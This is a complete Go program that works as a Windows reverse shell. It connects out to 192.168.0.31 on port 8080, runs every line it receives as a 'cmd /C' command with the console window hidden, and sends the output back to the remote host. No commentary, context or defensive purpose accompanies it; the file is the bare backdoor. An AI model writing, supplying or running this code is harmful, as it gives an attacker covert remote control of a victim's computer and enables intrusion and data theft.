package main
import "os/exec"
import "net"
import "syscall"
import "bufio"
func main(){
    c,_:=net.Dial("tcp","192.168.0.31:8080");
    for{
        status, _ := bufio.NewReader(c).ReadString('\n');
        cmd := exec.Command("cmd","/C", status)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, _ := cmd.Output();
        c.Write([]byte(out))
    }
}
